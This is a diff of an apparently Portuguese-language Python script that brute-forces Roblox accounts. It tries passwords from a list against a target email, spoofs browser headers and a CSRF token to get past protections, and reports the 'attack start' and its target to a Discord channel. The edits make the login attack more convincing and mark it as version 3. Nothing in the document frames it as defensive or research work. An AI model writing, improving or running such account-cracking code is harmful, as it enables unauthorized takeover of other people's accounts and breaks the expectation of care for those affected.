@@ -36,18 +36,16 @@ def get_csrf_token(session):
         if meta_tag:
             return meta_tag['content']
             
-        # Tentativa 2: Regex para encontrar o token no HTML (caso o nome da tag mude)
-        # Procura por algo como data-token="..." ou nome="csrf-token"
+        # Tentativa 2: Regex para encontrar o token no HTML
         csrf_match = re.search(r'name="csrf-token" content="([^"]+)"', html)
         if csrf_match:
             return csrf_match.group(1)
             
-        # Tentativa 3: Às vezes está em um script
+        # Tentativa 3: Script
         script_match = re.search(r'csrfToken\s*:\s*"([^"]+)"', html)
         if script_match:
             return script_match.group(1)
 
-        print("Token CSRF não encontrado. HTML recebido:", html[:500])
         return None
     except Exception as e:
         print(f"Erro ao pegar CSRF: {e}")
@@ -57,23 +55,24 @@ def try_login(email, password):
     """Tenta fazer login no Roblox"""
     session = requests.Session()
     
-    # User-Agent moderno
+    # User-Agent moderno e completo
     session.headers.update({
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
         'Accept': 'application/json, text/javascript, */*; q=0.01',
         'Accept-Language': 'en-US,en;q=0.9',
-        'Referer': f'{ROBLOX_BASE_URL}/login'
+        'Referer': f'{ROBLOX_BASE_URL}/login',
+        'Origin': 'https://www.roblox.com',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin'
     })
 
     # 1. Tentar pegar o Token CSRF
     csrf_token = get_csrf_token(session)
     
-    # Se não tiver token, tentamos de qualquer forma (algumas vezes o Roblox aceita sem ele em requisições simples)
-    headers_login = {
-        'Content-Type': 'application/x-www-form-urlencoded'
-    }
-    if csrf_token:
-        headers_login['X-CSRF-TOKEN'] = csrf_token
+    # Se não tiver token, o login provavelmente vai falhar, mas tentamos
+    if not csrf_token:
+        return {"success": False, "error": "Token CSRF não encontrado (Bloqueio de IP provável)"}
 
     # 2. Preparar dados
     payload = {
@@ -81,25 +80,24 @@ def try_login(email, password):
         'password': password
     }
 
-    # 3. Tentar Login
+    # 3. Tentar Login no endpoint correto
     try:
-        # Tentativa no endpoint padrão
+        # O endpoint correto é /users/login
         response = session.post(
             f"{ROBLOX_BASE_URL}/users/login",
             data=payload,
-            headers=headers_login,
+            headers={
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'X-CSRF-TOKEN': csrf_token,
+                'X-Requested-With': 'XMLHttpRequest'
+            },
             timeout=10
         )
         
-        # Se der erro 404, tentar o endpoint antigo ou novo
+        # Se der 404, o IP pode estar bloqueado pelo Cloudflare
         if response.status_code == 404:
-            response = session.post(
-                f"{ROBLOX_BASE_URL}/v1/users/login",
-                data=payload,
-                headers=headers_login,
-                timeout=10
-            )
-
+            return {"success": False, "error": "HTTP 404 (Endpoint não encontrado ou IP Bloqueado)"}
+            
         response.raise_for_status()
         data = response.json()
 
@@ -137,7 +135,7 @@ def start_brute_force(email):
         send_discord_message("**❌ ERRO:** Arquivo de senhas está vazio!")
         return
 
-    send_discord_message(f"**🚀 INÍCIO DO ATAQUE (Python v2)**\n**Alvo:** {email}\n**Total de Senhas:** {len(passwords)}")
+    send_discord_message(f"**🚀 INÍCIO DO ATAQUE (Python v3)**\n**Alvo:** {email}\n**Total de Senhas:** {len(passwords)}")
 
     found = False
     for password in passwords:
